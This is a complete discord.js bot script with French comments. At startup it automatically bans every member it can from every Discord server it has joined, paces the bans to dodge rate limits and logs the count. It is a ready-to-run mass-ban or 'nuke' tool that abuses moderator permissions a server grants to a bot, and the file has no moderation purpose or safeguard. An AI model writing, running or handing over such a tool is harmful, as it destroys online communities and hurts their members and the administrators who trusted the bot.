const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

// Remplacez par votre token de bot
const TOKEN = 'VOTRE_TOKEN_ICI';

// Créer une nouvelle instance du client Discord
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans
    ]
});

// Fonction pour banner tous les membres d'un serveur
async function banAllMembers(guild) {
    try {
        console.log(`🚀 Début du bannissement dans le serveur: ${guild.name}`);
        
        // Récupérer tous les membres du serveur
        const members = await guild.members.fetch();
        console.log(`📊 ${members.size} membres trouvés dans ${guild.name}`);
        
        let bannedCount = 0;
        let errorCount = 0;
        
        // Banner chaque membre (sauf le bot lui-même)
        for (const [memberId, member] of members) {
            // Ne pas se banner soi-même
            if (member.id === client.user.id) {
                continue;
            }
            
            // Ne pas banner les propriétaires du serveur
            if (member.id === guild.ownerId) {
                console.log(`⚠️ Impossible de banner le propriétaire: ${member.user.tag}`);
                continue;
            }
            
            try {
                // Vérifier si le bot a les permissions pour banner ce membre
                const botMember = guild.members.me;
                if (!botMember.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                    console.log(`❌ Le bot n'a pas la permission de bannir des membres`);
                    break;
                }
                
                // Vérifier si le membre peut être banni (hiérarchie des rôles)
                if (member.roles.highest.position >= botMember.roles.highest.position && member.id !== guild.ownerId) {
                    console.log(`⚠️ Impossible de banner ${member.user.tag} (rôle trop élevé)`);
                    continue;
                }
                
                await member.ban({ 
                    reason: 'Ban automatique au démarrage du bot' 
                });
                
                bannedCount++;
                console.log(`✅ ${member.user.tag} a été banni (${bannedCount}/${members.size - 1})`);
                
                // Petit délai pour éviter le rate limiting
                await new Promise(resolve => setTimeout(resolve, 100));
                
            } catch (error) {
                errorCount++;
                console.log(`❌ Erreur lors du bannissement de ${member.user.tag}:`, error.message);
            }
        }
        
        console.log(`🎯 Bannissement terminé dans ${guild.name}:`);
        console.log(`   ✅ ${bannedCount} membres bannis`);
        console.log(`   ❌ ${errorCount} erreurs`);
        
    } catch (error) {
        console.error(`💥 Erreur lors du bannissement dans ${guild.name}:`, error);
    }
}

// Event: Le bot est prêt
client.once('ready', async () => {
    console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);
    console.log(`📡 Connecté à ${client.guilds.cache.size} serveur(s)`);
    
    // Banner tous les membres de chaque serveur
    for (const [guildId, guild] of client.guilds.cache) {
        console.log(`\n🎯 Traitement du serveur: ${guild.name} (${guild.memberCount} membres)`);
        await banAllMembers(guild);
        
        // Délai entre les serveurs pour éviter les problèmes
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log('\n🏁 Toutes les opérations de bannissement sont terminées');
});

// Event: Erreur
client.on('error', error => {
    console.error('❌ Erreur du client Discord:', error);
});

// Event: Avertissement
client.on('warn', warning => {
    console.warn('⚠️ Avertissement:', warning);
});

// Gestion des erreurs non capturées
process.on('unhandledRejection', error => {
    console.error('💥 Erreur non gérée:', error);
});

// Connexion du bot
console.log('🔌 Connexion du bot...');
client.login(TOKEN).catch(error => {
    console.error('❌ Erreur de connexion:', error);
    process.exit(1);
});